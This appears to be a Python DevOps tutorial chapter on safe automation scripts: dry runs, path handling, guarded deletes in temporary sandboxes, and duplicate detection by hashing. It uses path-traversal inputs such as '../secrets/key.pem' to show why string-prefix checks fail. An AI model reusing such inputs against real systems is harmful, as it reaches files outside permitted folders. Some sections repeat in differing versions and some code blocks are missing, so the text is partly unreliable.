Python for DevOps 3:
Automation Scripts & Resilience

Anyone can write a script that works once on their laptop. The job is writing the script that is still safe at 3 a.m. on a production box, when the disk is full, the network is flaky, the cron job fires twice, and someone runs it by hand "just to check." This chapter is about the habits that separate the two: dry-runs, injected clocks, idempotency, atomic writes, locks, retries that don't melt the service they're retrying, honest exit codes, and never letting user input near a shell.

3.1 — What an Automation Script Is, and What "Safe in Production" Means

Until now, every program you wrote was run by you, watching the screen. If it printed something strange, you noticed and pressed Ctrl-C. An automation script is different: it is a program that does a chore without a human watching. Rotate the log files every night. Delete backups older than a month. Check that fifty servers are answering. Because nobody is watching, the script has to be its own careful supervisor.

The place these scripts run is called production: the real computers that real people depend on, as opposed to a practice copy. Think of a house-sitter who follows a written note while you are away. The sitter cannot phone you at 3 a.m. to ask "the note says water the plants, but the plants are already under water, what now?" So the note must say what to do in every strange situation, and the sitter must refuse to do anything that could ruin the house. Safe to run in production means exactly that: the script does the right thing on a good day, does nothing harmful on a bad day, and tells you honestly which kind of day it was.

The problem: a script that works, until it doesn't

Asha keeps nightly backups in a folder. It fills up, so she writes a cleanup: delete every backup older than keep_days. To keep the demo safe, the "folder" here is just a dictionary from file name to age in days. Nothing real is deleted.

A naive cleanup with a typo in its setting
backups = {"db-mon": 6, "db-tue": 5, "db-wed": 4, "db-thu": 3, "db-fri": 2} def naive_cleanup(files, keep_days): deleted = [] for name, age in files.items(): if age >= keep_days: deleted.append(name) return deleted print("intended (keep_days=7):", naive_cleanup(backups, 7)) print("typo (keep_days=0):", naive_cleanup(backups, 0))
Output
intended (keep_days=7): []
typo     (keep_days=0): ['db-mon', 'db-tue', 'db-wed', 'db-thu', 'db-fri']

With the intended setting, nothing is deleted because nothing is 7 days old yet. With one mistyped digit, the script proudly deletes every backup you own, exits happily, and you find out the day you need a restore. The script did exactly what it was told. The trouble is that nothing in it asked "is this plan sensible?"

The idea: plan first, look, then act

The fix is a shape you will reuse in every section of this chapter. Split the work in two. First a plan: a function that only decides what should happen and returns it as data, touching nothing. Then an apply step that carries the plan out. Between them you can print the plan, ask a human, or check it against a guard rail. Running only the plan is called a dry run: a rehearsal that changes nothing.

The safe shape of every script in this chapter
   input (config, files)
          |
          v
   +--------------+    pure function: decides, changes nothing
   |     PLAN     |    returns:  keep = [...]   delete = [...]
   +--------------+
          |
          v
   +--------------+    "refuse if the plan deletes too much"
   |  GUARD RAILS |    "refuse if a path is outside the folder"
   +--------------+
          |
          +---- dry run? --yes--> print "would delete ..." and stop
          |
          no
          v
   +--------------+
   |    APPLY     |    the only step that changes the world
   +--------------+
          |
          v
   report: log lines + an honest exit code
The dangerous step is small and comes last. Everything before it can be tested without risk.
The same cleanup, split into plan and apply
backups = {"db-mon": 6, "db-tue": 5, "db-wed": 4, "db-thu": 3, "db-fri": 2} def plan(files, keep_days): return [name for name, age in files.items() if age >= keep_days] def apply(names, dry_run=True): # safe by default for name in names: print(("would delete " if dry_run else "DELETING ") + name) todo = plan(backups, 0) # the typo again print("plan has", len(todo), "of", len(backups), "files") apply(todo) # dry run: prints only
Output
plan has 5 of 5 files
would delete db-mon
would delete db-tue
would delete db-wed
would delete db-thu
would delete db-fri
What Python does, line by line
  1. plan(backups, 0) walks the dictionary and returns a plain list of names. It has no side effects, so calling it is always safe.
  2. The list is stored in todo. The plan is now data you can inspect, count, print or test.
  3. len(todo) is 5 and len(backups) is 5. A human (or a guard rail) sees "the plan removes 100 percent" and can stop.
  4. apply(todo) uses the default dry_run=True, so each name prints as "would delete". Nothing else happens.

Notice the default. dry_run=True means a person who forgets the flag gets the harmless behaviour. Real deletion should need a deliberate dry_run=False. Now add the first guard rail: a circuit breaker, named after the switch that trips when too much current flows. It refuses any plan that touches more than half of the files.

A guard rail that trips
def check_plan(todo, total, max_fraction=0.5): if total and len(todo) / total > max_fraction: raise RuntimeError(f"refusing: plan removes {len(todo)} of {total} files") check_plan(["db-mon"], 5) # 1 of 5: fine, no output print("small plan accepted") try: check_plan(["a", "b", "c", "d", "e"], 5) except RuntimeError as e: print("tripped:", e)
Output
small plan accepted
tripped: refusing: plan removes 5 of 5 files

A guard rail is not clever. It is a cheap, boring check that turns "silent disaster" into "loud, harmless refusal". You will meet more of them: path checks, keep-the-newest-K, locks and timeouts.

Common mistake: trusting values that come from outside

Settings for a script usually arrive as text: from a config file, an environment variable or the command line. Text is not a number, even when it looks like one.

Comparing an age to a setting that is still textread-only
age = 3 keep_days = "7" # came from a config file: it is a string if age >= keep_days: print("delete")
What Python says
Traceback (most recent call last):
  File "<exec>", line 3, in <module>
TypeError: '>=' not supported between instances of 'int' and 'str'

Read errors from the bottom. '>=' not supported between instances of 'int' and 'str' says you compared a number with text. The fix is to convert once, at the edge, where the value enters your program: keep_days = int(raw_value). The previous chapter on config files showed how to validate values, and the same idea applies to every input a script receives.

⭐
Six habits for the rest of the chapter. Each later section teaches one: (1) plan before acting, with an injected clock; (2) guard every delete; (3) make re-running harmless (idempotent); (4) write files atomically; (5) bound retries and timeouts; (6) report honestly with exit codes and structured logs.
Why does apply default to dry_run=True instead of False?
The default is what happens when a tired person forgets the flag. Making the harmless behaviour the default means a mistake costs nothing. Real changes need a deliberate opt-in.
Try it. In the circuit-breaker block, change max_fraction to 1.0 and call it with all five names. Does it still trip? Now try 0.9. Find the smallest plan size that trips at 0.5.
Recap
  • An automation script runs unattended, so it must supervise itself; safe in production means harmless on a bad day and honest about what happened.
  • Split every script into a pure plan (returns data) and an apply step (changes things), with a dry run in between.
  • Make the safe behaviour the default, and add cheap guard rails such as a circuit breaker.
  • Values from files and the command line are text: convert them once, at the edge.
3.2 — The Filesystem as a Tree, and Paths as Objects

Most automation touches files: logs to rotate, backups to prune, configs to update. Before writing any of that, you need a clear picture of what a filesystem is. It is a tree: one starting folder called the root (written / on Linux), folders inside it, more folders inside those, and files at the tips like leaves. Every file has exactly one path, its address, listing the folders you pass through to reach it, separated by slashes.

A small filesystem tree and the path of each leaf
  /                                  <- root
  +-- srv/
  |   +-- app/
  |   |   +-- config.yaml            /srv/app/config.yaml
  |   |   +-- logs/
  |   |       +-- app.log            /srv/app/logs/app.log
  |   |       +-- app.log.1          /srv/app/logs/app.log.1
  |   +-- backups/
  |       +-- db-2025-03-14.sql.gz   /srv/backups/db-2025-03-14.sql.gz
  +-- tmp/

  absolute path: starts at the root      /srv/app/logs/app.log
  relative path: starts from "here"      logs/app.log   (if here = /srv/app)
Reading a path left to right walks down the tree, one folder per slash.
The problem: paths built from plain text

The old way is to treat a path as an ordinary string and glue pieces together with +. It looks fine until the day one piece has a slash you did not expect.

Gluing paths together as text
folder = "/srv/backups" # somebody's config forgot the trailing slash name = "db-2025-03-14.sql.gz" print(folder + name) folder2 = "/srv/backups/" # somebody else's config has one print(folder2 + name)
Output
/srv/backupsdb-2025-03-14.sql.gz
/srv/backups/db-2025-03-14.sql.gz

The first result, /srv/backupsdb-2025-03-14.sql.gz, is a file in the wrong folder with a wrong name. The script would happily "succeed" on an address that does not exist. What we want is to say what we mean (this folder, then this file) and let Python handle slashes.

The idea: a path is an object with useful parts

The standard library's pathlib module gives you the Path class. A Path is an object (a value that carries its own methods, like the ones you built in the OOP chapters) that knows it is an address. It can tell you its parent folder, its file name, its extension. Think of the address on an envelope: a street, a house number and a name. You do not cut it up with scissors; you ask for the part you want. Here is the smallest example. Nothing in it touches the disk, because a Path is only an address until you use it.

The parts of a path
from pathlib import Path p = Path("/srv/backups/db-2025-03-14.sql.gz") print("name :", p.name) print("stem :", p.stem) print("suffix :", p.suffix) print("parent :", p.parent) print("parts :", p.parts)
Output
name   : db-2025-03-14.sql.gz
stem   : db-2025-03-14.sql
suffix : .gz
parent : /srv/backups
parts  : ('/', 'srv', 'backups', 'db-2025-03-14.sql.gz')
What Python does, line by line
  1. Path("/srv/backups/db-2025-03-14.sql.gz") splits the text at every slash and stores the pieces. Nothing is read from disk.
  2. .name is the last piece, the file name. .parent is everything before it.
  3. .suffix is the last extension only: .gz, not .sql.gz. The full list is in .suffixes. .stem is the name with that one extension removed.
  4. .parts is the tuple of pieces, starting with '/' for the root.

Now joining. The / operator, which you normally use for division, is redefined for paths so that folder / name means "this name inside that folder". Every / makes a new Path; the old one is unchanged. Extra or missing slashes stop mattering.

Joining and changing paths
from pathlib import Path for folder in ("/srv/backups", "/srv/backups/"): print(Path(folder) / "db-2025-03-14.sql.gz") p = Path("/srv/app/logs/app.log") print(p.with_suffix(".log.1")) print(p.with_name("error.log")) print(p.relative_to("/srv/app"))
Output
/srv/backups/db-2025-03-14.sql.gz
/srv/backups/db-2025-03-14.sql.gz
/srv/app/logs/app.log.1
/srv/app/logs/error.log
logs/app.log

The bug from the first block is gone: both inputs give the same correct path. The three "with" and "relative" lines show that changing a path builds a new one instead of editing text. relative_to is how you print a friendly short name, and you will use it often in reports.

Touching the real disk

A Path becomes useful when you ask it about real files: .exists(), .is_file(), .mkdir(), .write_text(), .read_text(), .iterdir(), .stat(). To experiment without risking anything real, we ask for a brand-new empty scratch folder with tempfile.mkdtemp() (next section explains it fully). The helper below builds a small tree from a dictionary and pins each file's modification time, so later sections have fixed data. You will reuse make_tree in the next few sections.

Build a sandbox tree and list it
import os, tempfile from pathlib import Path def make_tree(root, spec): for rel, (data, mtime) in spec.items(): p = root / rel p.parent.mkdir(parents=True, exist_ok=True) p.write_bytes(data) os.utime(p, (mtime, mtime)) # pin the modification time root = Path(tempfile.mkdtemp()) make_tree(root, {"app/logs/app.log": (b"x" * 5000, 1_700_000_000), "app/logs/app.log.1": (b"y" * 20000, 1_699_000_000), "app/config.yaml": (b"name: demo\n", 1_700_500_000)}) for p in sorted(root.rglob("*")): kind = "dir " if p.is_dir() else "file" print(kind, p.relative_to(root).as_posix())
Output
dir  app
file app/config.yaml
dir  app/logs
file app/logs/app.log
file app/logs/app.log.1
Variations: one level, or every level

.iterdir() lists only the direct children of a folder. .glob("*.log") filters by a pattern on one level. .rglob("*") means "recursive glob": it walks every level below. Directory order is not guaranteed, so wrap the result in sorted(...) whenever the order matters, as above.

iterdir versus glob versus rglob
import tempfile from pathlib import Path root = Path(tempfile.mkdtemp()) (root / "logs").mkdir() (root / "logs" / "a.log").write_text("1") (root / "logs" / "b.txt").write_text("2") (root / "top.log").write_text("3") print("iterdir :", sorted(p.name for p in root.iterdir())) print("glob :", sorted(p.name for p in root.glob("*.log"))) print("rglob :", sorted(p.name for p in root.rglob("*.log")))
Output
iterdir : ['logs', 'top.log']
glob    : ['top.log']
rglob   : ['a.log', 'top.log']

glob("*.log") found only top.log because a.log is one level deeper. rglob("*.log") found both. When a cleanup "misses" files in subfolders, this is nearly always the reason.

Common mistakes, with the real messages

Reading something that is not there. Reading a missing file raises an error that names the path.

Reading a file that does not existread-only
from pathlib import Path print(Path("/no/such/dir/app.log").read_text())
What Python says
Traceback (most recent call last):
  File "<exec>", line 2, in <module>
FileNotFoundError: [Errno 2] No such file or directory: '/no/such/dir/app.log'

FileNotFoundError: [Errno 2] No such file or directory is the operating system's answer, and Python quotes the address it tried. Check the spelling of the path, or test p.exists() first when a missing file is a normal case. Creating a folder that already exists is the opposite error.

Making a folder that already existsread-only
from pathlib import Path Path("/tmp").mkdir()
What Python says
Traceback (most recent call last):
  File "<exec>", line 2, in <module>
FileExistsError: [Errno 17] File exists: '/tmp'

The fix is the option you already saw in make_tree: mkdir(parents=True, exist_ok=True). exist_ok=True says "already there is fine", and parents=True also creates any missing folders above it. This is your first step toward scripts that are safe to run twice.

For Path("/srv/app/logs/app.log.1"), what are .name, .suffix and .parent?
app.log.1, .1 (the last extension only), and /srv/app/logs.
Why sort the result of rglob before printing it?
The order the filesystem returns entries is not guaranteed. Sorting makes output and tests repeatable.
Try it. In the joining block, add a third folder "/srv//backups" to the tuple and see what Path makes of the doubled slash. Then print p.suffixes for the .sql.gz path.
Recap
  • A filesystem is a tree; a path is a file's address, absolute (from the root) or relative (from here).
  • Path objects join with / and expose .name, .stem, .suffix, .parent, .parts; they never touch the disk until you ask.
  • iterdir is one level, glob is a pattern on one level, rglob is every level. Sort for stable order.
  • mkdir(parents=True, exist_ok=True) is the re-runnable way to make folders.
3.3 — Safe Sandboxes and Safe Deletes: tempfile and shutil

pathlib can create, read and list. Two more standard modules finish the toolbox. tempfile gives you throwaway folders to practise in, so your automation never has to be tried out on real data. shutil ("shell utilities") copies, moves and removes whole folders, and reports free disk space. Between them sits the most important habit in this chapter: never delete something until you have proven it lives where you think it lives.

The problem: a check that looks right and is wrong

A cleanup script is only allowed to delete inside /data/backups. The obvious safety check is to ask whether the target path starts with that text. Try it on three targets.

The startswith check, tried on three targets
allowed = "/data/backups" targets = [ "/data/backups/db-2025-03-14.sql.gz", # inside: fine "/data/backups-old/db-2020.sql.gz", # a DIFFERENT folder "/data/backups/../secrets/key.pem", # climbs out with .. ] for t in targets: print(t.startswith(allowed), t)
Output
True /data/backups/db-2025-03-14.sql.gz
True /data/backups-old/db-2020.sql.gz
True /data/backups/../secrets/key.pem

All three say True. The second is a sibling folder whose name merely begins the same way. The third contains .., which means "go up one folder", so it really points at /data/secrets/key.pem. A cleanup script trusting this check would delete the wrong files. The problem is comparing spellings instead of locations.

The idea: resolve, then compare locations

Path.resolve() turns any spelling into the real, absolute address: it removes .. and ., and follows symlinks (shortcuts that point to another place). Then is_relative_to(root) asks the right question: "is this location inside that folder in the tree?" Picture a security guard who checks where your ID says you live, not what your badge is called.

Same text prefix, different location
  /data
  +-- backups/                <- allowed root
  |   +-- db-2025-03-14.sql.gz    inside   -> may delete
  +-- backups-old/            <- text starts the same, but it is a sibling
  |   +-- db-2020.sql.gz          outside  -> refuse
  +-- secrets/
      +-- key.pem                 outside  -> refuse

  /data/backups/../secrets/key.pem
        |         |
        |         +-- ".." = step back up to /data
        +-- so this path really ends in /data/secrets/key.pem
resolve() does the walking for you and hands back the final address.
resolve and is_relative_to
from pathlib import Path root = Path("/data/backups").resolve() targets = ["/data/backups/a.gz", "/data/backups-old/b.gz", "/data/backups/../secrets/key.pem"] for t in targets: p = Path(t).resolve() print(p.is_relative_to(root), p)
Output
True /data/backups/a.gz
False /data/backups-old/b.gz
False /data/secrets/key.pem

Now the answers are True, False, False, which is exactly right. resolve() collapsed the .. in the third target into /data/secrets/key.pem, and is_relative_to compared real folders, not text.

A sandbox that cleans up after itself

tempfile.mkdtemp() creates a new empty folder with a random name and leaves it for you to remove. tempfile.TemporaryDirectory() is the tidy version. Used in a with block, it creates the folder on entry and deletes the folder and everything in it on exit, even if your code crashes inside the block. Random names differ each run, so we print only what we can predict.

TemporaryDirectory cleans up by itself
import tempfile from pathlib import Path with tempfile.TemporaryDirectory() as tmp: sandbox = Path(tmp) (sandbox / "scratch.txt").write_text("hello") print("inside the block:", sandbox.exists(), sorted(p.name for p in sandbox.iterdir())) print("after the block :", sandbox.exists())
Output
inside the block: True ['scratch.txt']
after the block : False
shutil: copying, and what copy forgets

shutil.copy(src, dst) copies the contents. shutil.copy2(src, dst) also copies the metadata, including the file's modification time. That matters for backups and for retention rules that look at age: a plain copy makes a 2-year-old file look brand new.

copy versus copy2
import os, shutil, tempfile from pathlib import Path with tempfile.TemporaryDirectory() as tmp: src = Path(tmp) / "old.log" src.write_text("data") os.utime(src, (1_600_000_000, 1_600_000_000)) # pretend it is old shutil.copy(src, Path(tmp) / "plain.log") shutil.copy2(src, Path(tmp) / "kept.log") for name in ("plain.log", "kept.log"): same = Path(tmp, name).stat().st_mtime == src.stat().st_mtime print(name, "has the original time:", same)
Output
plain.log has the original time: False
kept.log has the original time: True

The plain copy got a fresh modification time, so the comparison says False. copy2 kept the original, so it says True. Other helpers to know: shutil.copytree(src, dst) copies a whole folder, shutil.move moves across filesystems, shutil.rmtree(folder) deletes a whole folder tree with no undo, and shutil.disk_usage(path) returns total, used and free bytes for the disk that path lives on.

Putting it together: safe_delete

Here is the guard from the diagram as a function. It resolves both paths, refuses anything outside the allowed root, and also refuses the root itself, so a typo cannot delete the whole backup folder.

Refuse to delete outside the allowed root
import tempfile from pathlib import Path def safe_delete(target, root): target, root = Path(target).resolve(), Path(root).resolve() if target == root or not target.is_relative_to(root): raise ValueError(f"refusing to delete {target.name}: outside the allowed root") target.unlink() with tempfile.TemporaryDirectory() as a, tempfile.TemporaryDirectory() as b: root, other = Path(a), Path(b) (root / "old.log").write_text("stale") (other / "precious.db").write_text("keep me") safe_delete(root / "old.log", root) print("deleted inside root:", not (root / "old.log").exists()) try: safe_delete(root / ".." / other.name / "precious.db", root) except ValueError as e: print("blocked:", e) print("precious.db survived:", (other / "precious.db").exists())
Output
deleted inside root: True
blocked: refusing to delete precious.db: outside the allowed root
precious.db survived: True
What Python does, line by line
  1. Two temporary folders are created; a is the allowed root, b is "somewhere else".
  2. safe_delete(root / "old.log", root) resolves both paths, sees the file is inside the root, and calls unlink() (delete one file).
  3. The second call builds root/../<other>/precious.db. Its text begins with the root, but resolve() reveals the true location outside it, so ValueError is raised before anything is deleted.
  4. The last line proves the file survived. Both folders vanish when the with block ends.
Common mistake: removing what is not there

A cleanup that removes a folder another run already removed fails loudly.

rmtree on a folder that does not existread-only
import shutil shutil.rmtree("/no/such/folder")
What Python says
Traceback (most recent call last):
  File "<exec>", line 2, in <module>
FileNotFoundError: [Errno 2] No such file or directory: '/no/such/folder'

The message names the path. When "already gone" is acceptable, use shutil.rmtree(p, ignore_errors=True) or, for a single file, p.unlink(missing_ok=True). Use them deliberately: they hide real problems too. Never point rmtree at a path you have not passed through a guard like safe_delete.

💡
Version note. is_relative_to needs Python 3.9 or newer. On older versions the same idea is root in target.parents after resolve(). Either way, never compare raw path strings.
Why does /data/backups-old/x pass startswith("/data/backups") but fail is_relative_to(Path("/data/backups"))?
startswith compares characters. is_relative_to compares whole path pieces (backups-old is not backups), so the sibling folder is correctly rejected.
Try it. In the safe_delete block, call safe_delete(root, root) and read the message. Then delete the target == root half of the check, re-run, and think about what would have happened.
Recap
  • Compare locations, not spellings: resolve() first, then is_relative_to().
  • tempfile.TemporaryDirectory() is a throwaway sandbox that removes itself; use it for practice and tests.
  • shutil.copy2 keeps timestamps; rmtree has no undo and must sit behind a guard.
  • missing_ok=True and ignore_errors=True are for deliberate "already gone is fine" cases.
3.4 — A Disk-Usage Report You Can Test

"The disk is 94% full. What is eating it?" is a daily question in operations. In a shell you would answer with du -sh * | sort -h. Writing the same report in Python pays off once you need to run it on a schedule, alert on a threshold, or post the result to a chat channel. It is also a perfect first automation project: the whole thing is a loop, a dictionary and a sort, all tools you already own.

The problem: counting one file is easy, thousands is not

A file's size in bytes is path.stat().st_size. That is one number for one file. What you want is one number per top-level folder, so you can say "var holds most of the space". The idea is the same as sorting a pile of mail into pigeonholes: go through every file once, drop its size into the hole labelled with its top folder, and at the end add up each hole. Programmers call this grouping and summing.

Sizes flow into one bucket per top-level folder
   files found by rglob("*")            top-level bucket        running total
   var/log/syslog        1,800,000 B  ---->  var    ------------>  1,800,000
   var/log/auth.log        240,000 B  ---->  var    ------------>  2,040,000
   var/cache/pkg.tar     5,200,000 B  ---->  var    ------------>  7,240,000
   home/deploy/.bashrc       3,800 B  ---->  home   ------------>      3,800
   tmp/scratch.dat             640 B  ---->  tmp    ------------>        640
The bucket name is the first piece of the path relative to the root: parts[0].

The one dictionary trick you need is totals.get(key, 0). It reads the current total for a bucket, or gives 0 if the bucket has never been seen. Adding the new size and storing it back is the entire accumulator. Below is the smallest version, with sizes written out as plain numbers so you can follow it without touching the disk.

Group and sum with a dictionary

3.5 — Hashing Files to Find Duplicates

Backups pile up. Somebody copies a release archive into three folders. A "clean-up" script would love to know which files are really the same so it can delete the spares and reclaim disk space. This section teaches the tool that makes that possible, a hash, and then a way to use it without waiting all night.

The problem: how do you know two files are identical?

File names lie: final.zip and final-v2.zip may hold the same bytes, and two files both called app.tgz may differ. File sizes are not proof either: two different files can have the same length. Comparing every byte of every pair is correct but slow. With 1,000 files that is half a million pairs. We need a short summary of a file's contents that is cheap to compare.

The idea: a fingerprint for data

A hash function reads any amount of data and produces a short, fixed-length string called a digest. Think of a fingerprint: every person has one, it is the same size for a baby and a giant, the same finger always gives the same print, and two different people almost never match. Hashes have the same three properties. Same input, same digest, every time. Any change, even one letter, gives a completely different digest. And the digest has the same length whatever the input size. SHA-256 gives 64 hexadecimal characters. Here it is in four lines, printing only the first 16 characters to keep the lines short.

A hash is a fingerprint
import hashlib for data in (b"hello", b"hello", b"hello!", b"x" * 1_000_000): digest = hashlib.sha256(data).hexdigest() print(len(data), digest[:16], len(digest))
Output
5 2cf24dba5fb0a30e 64
5 2cf24dba5fb0a30e 64
6 ce06092fb948d9ff 64
1000000 1b977e9f84f1b26b 64
What Python does, line by line
  1. b"hello" is bytes, the raw data a file holds. (A normal string like "hello" is text; bytes are what hashing needs.)
  2. hashlib.sha256(data) runs the algorithm; .hexdigest() writes the result in hexadecimal.
  3. Lines 1 and 2 have identical input, so identical digests. Line 3 adds one ! and the digest is unrecognisable. Line 4 is a million bytes, and the digest is still 64 characters.
Hashing a file without loading it all

A backup can be 50 GB. Calling path.read_bytes() would try to put all of it in memory and the system would kill your script. The hash object solves this: you feed it pieces with .update(piece), and the final digest is the same as if you had fed it everything at once. Reading a file in fixed-size pieces is called chunking, and memory use stays flat whatever the file size.

Chunked hashing gives the same answer
import hashlib, tempfile from pathlib import Path def sha256_of(path, chunk_size=65536): h = hashlib.sha256() with open(path, "rb") as f: # "rb" = read bytes while chunk := f.read(chunk_size): # empty bytes at the end = False h.update(chunk) return h.hexdigest() with tempfile.TemporaryDirectory() as tmp: p = Path(tmp) / "a.bin" p.write_bytes(b"BINARY-A" * 500) whole = hashlib.sha256(p.read_bytes()).hexdigest() print("same digest:", sha256_of(p) == whole == sha256_of(p, chunk_size=7))
Output
same digest: True

The loop line deserves a slow read. f.read(65536) returns the next 64 KB. The := (the "walrus") stores that piece in chunk and tests it. When the file is used up, read returns empty bytes, which count as false, and the loop ends. Using chunk_size=7 gives the same digest, just with more, smaller pieces.

Making it fast: size first, hash second

Hashing reads every byte, so hashing millions of files is slow. But two files can only be identical if they have the same size, and a size costs almost nothing to read. So group by size first, throw away every size that occurs only once (that file cannot have a twin), and hash only what is left.

Duplicate finder: cheap check first, expensive check last
   4 files
     releases/app-1.0.tgz   4000 B
     backup/app-1.0.tgz     4000 B
     releases/app-1.1.tgz   4000 B
     notes/todo.txt           12 B
            |
            v   group by size  (one cheap stat per file)
   4000 B -> [app-1.0 (releases), app-1.0 (backup), app-1.1]
     12 B -> [todo.txt]              <- alone: cannot have a twin, SKIP
            |
            v   hash only the 3 survivors
   digest A -> [releases/app-1.0.tgz, backup/app-1.0.tgz]   <- duplicates!
   digest B -> [releases/app-1.1.tgz]                       <- same size, different content
Only 3 of 4 files were ever read. On a real tree the saving is most of the work.
find_duplicates
import hashlib, tempfile from pathlib import Path def find_duplicates(root): by_size = {} for p in root.rglob("*"): if p.is_file(): by_size.setdefault(p.stat().st_size, []).append(p) hashed, groups = 0, {} for size, paths in by_size.items(): if len(paths) < 2: continue # unique size: skip the hash for p in paths: hashed += 1 groups.setdefault(hashlib.sha256(p.read_bytes()).hexdigest(), []).append(p.relative_to(root).as_posix()) return sorted(sorted(g) for g in groups.values() if len(g) > 1), hashed root = Path(tempfile.mkdtemp()) for rel, data in {"releases/app-1.0.tgz": b"AAAAAAAA" * 500, "backup/app-1.0.tgz": b"AAAAAAAA" * 500, "releases/app-1.1.tgz": b"BBBBBBBB" * 500, "notes/todo.txt": b"rotate certs"}.items(): (root / rel).parent.mkdir(parents=True, exist_ok=True) (root / rel).write_bytes(data) print(find_duplicates(root))
Output
([['backup/app-1.0.tgz', 'releases/app-1.0.tgz']], 3)

To keep the block short, this version reads whole files with read_bytes(); in real code you would call sha256_of from before. Read the result for what it teaches. The pair backup/app-1.0.tgz and releases/app-1.0.tgz is reported as a duplicate group. app-1.1.tgz has the same size but different content, so the hash correctly kept it out. And the second number, 3, says only three of four files were ever hashed: todo.txt had a unique size. The word setdefault means "give me the list for this key, creating an empty one if it is missing", a compact form of the get trick from 3.4.

Common mistakes

Hashing text instead of bytes. Hash functions work on bytes. A str must be converted first with .encode().

Hashing a stringread-only

What Python says
Traceback (most recent call last):
  File "<exec>", line 2, in <module>
TypeError: Strings must be encoded before hashing

The message Strings must be encoded before hashing says exactly that. The fix: hashlib.sha256("hello".encode()).hexdigest(). Two more mistakes are silent rather than loud. Trusting the size alone would report app-1.1.tgz as a duplicate. And hashing everything instead of only same-size candidates works, just slowly. A last note on choice of hash: for security or compliance use SHA-256, as here. For a quick internal de-duplication a faster hash is acceptable, but do not call that "verification".

Two files have different sizes. Do you need to hash them to know they are different?
No. Different sizes already prove different contents. That is exactly why grouping by size first saves so much work.
Why feed a hash in chunks with update() instead of reading the whole file?
Memory stays small and constant, even for a 50 GB file, and the final digest is identical.

Recap
  • A hash is a fixed-length fingerprint of data: same input gives the same digest, any change gives a different one.
  • Hash bytes, and feed big files in chunks with update() so memory stays flat.
  • Find duplicates in two stages: group by size (cheap), then hash only sizes that occur twice or more.

3.1 — Filesystem Automation With pathlib, shutil and tempfile

pathlib.Path is the modern way to touch the filesystem from a script: paths are objects, / joins them, and .parent, .name, .suffix, .read_text(), .rglob() replace a pile of os.path.join calls and string slicing. Two habits matter more than the API: build test data in a throwaway directory (tempfile.mkdtemp() or TemporaryDirectory()) so your automation never has to be tried out on real data, and make every step safe to repeat (mkdir(parents=True, exist_ok=True) instead of "create it and crash if it exists"). The helper below builds a small file tree with fixed contents and fixed modification times, and you'll reuse it for the next few sections.

Build a sandbox file tree, then walk it
import os, tempfile from pathlib import Path def make_tree(root, spec): """spec maps 'relative/path' -> (content_bytes, epoch_mtime).""" for rel, (data, mtime) in spec.items(): p = root / rel p.parent.mkdir(parents=True, exist_ok=True) # exist_ok => safe to re-run p.write_bytes(data) os.utime(p, (mtime, mtime)) # pin mtime so output is deterministic root = Path(tempfile.mkdtemp(prefix='do03-')) make_tree(root, { 'app/logs/app.log': (b'x' * 5000, 1_700_000_000), 'app/logs/app.log.1': (b'y' * 20000, 1_699_000_000), 'app/cache/blob.bin': (b'z' * 90000, 1_698_000_000), 'app/config.yaml': (b'name: demo\n', 1_700_500_000), }) for p in sorted(root.rglob('*')): if p.is_file(): print(f'{p.relative_to(root).as_posix():<20} {p.stat().st_size:>6} bytes')

shutil covers the operations pathlib doesn't: shutil.copy2(src, dst) copies and preserves timestamps (plain copy doesn't), shutil.copytree and shutil.rmtree handle whole directories, and shutil.disk_usage(path) returns total/used/free bytes for the filesystem a path lives on. The dangerous one is deletion. Automation that deletes must prove the target is inside the directory it was pointed at, after resolving .. segments and symlinks — otherwise a bad config value or a crafted filename turns your cleanup script into rm -rf on something precious.

Refuse to delete outside the allowed root
import os, tempfile from pathlib import Path def safe_delete(target, root): target, root = Path(target).resolve(), Path(root).resolve() if target == root or not target.is_relative_to(root): raise ValueError(f'refusing to delete {target.name}: it is outside the allowed root') target.unlink() root = Path(tempfile.mkdtemp()) (root / 'old.log').write_text('stale') outside = Path(tempfile.mkdtemp()) / 'precious.db' outside.write_text('do not touch') safe_delete(root / 'old.log', root) print('deleted inside root:', not (root / 'old.log').exists()) try: safe_delete(root / '..' / outside.parent.name / 'precious.db', root) except ValueError as e: print('blocked:', e) print('precious.db survived:', outside.exists())
🚫
Resolve first, then compare. Checking str(target).startswith(str(root)) on the raw path is a classic bug: /data/backups-old starts with /data/backups, and /data/backups/../secrets passes the string test but points elsewhere. 3.3 — Finding Duplicate Files by Content

Duplicate detection is a good example of writing automation that scales. The naive version hashes every file — fine for 100 files, painful for 5 million or for a 200 GB tree. The trick is that a hash is only needed to distinguish files that could be equal, and two files can only be equal if they are the same size. So: group by size first (a cheap stat), skip every size that appears once, and hash only the survivors. Hash in fixed-size chunks so memory stays flat no matter how large the file is — path.read_bytes() on a 50 GB file is an out-of-memory kill waiting to happen.

Group by size, then hash only the candidates
import hashlib, os, tempfile from pathlib import Path def make_tree(root, spec): """spec maps 'relative/path' -> (content_bytes, epoch_mtime).""" for rel, (data, mtime) in spec.items(): p = root / rel p.parent.mkdir(parents=True, exist_ok=True) # exist_ok => safe to re-run p.write_bytes(data) os.utime(p, (mtime, mtime)) # pin mtime so output is deterministic def sha256_of(path, chunk_size=65536): h = hashlib.sha256() with open(path, 'rb') as f: while chunk := f.read(chunk_size): # constant memory, even for a 50 GB file h.update(chunk) return h.hexdigest() def find_duplicates(root): by_size = {} for p in root.rglob('*'): if p.is_file(): by_size.setdefault(p.stat().st_size, []).append(p) hashed, groups = 0, {} for size, paths in by_size.items(): if len(paths) < 2: continue # a unique size cannot have a duplicate: skip the hash for p in paths: hashed += 1 groups.setdefault(sha256_of(p), []).append(p.relative_to(root).as_posix()) dupes = sorted(sorted(g) for g in groups.values() if len(g) > 1) return dupes, hashed root = Path(tempfile.mkdtemp()) make_tree(root, { 'releases/app-1.0.tgz': (b'BINARY-A' * 500, 0), 'backup/app-1.0.tgz': (b'BINARY-A' * 500, 0), 'releases/app-1.1.tgz': (b'BINARY-B' * 500, 0), # same size, different content 'notes/todo.txt': (b'rotate certs', 0), # unique size: never hashed }) dupes, hashed = find_duplicates(root) print('duplicate groups:', dupes) print('files hashed:', hashed, 'of 4')
⭐
Read the output for what it teaches: three of four files were hashed, not four — todo.txt had a unique size and never touched the disk again. 3.4 — Retention and Rotation Policies With an Injected Clock

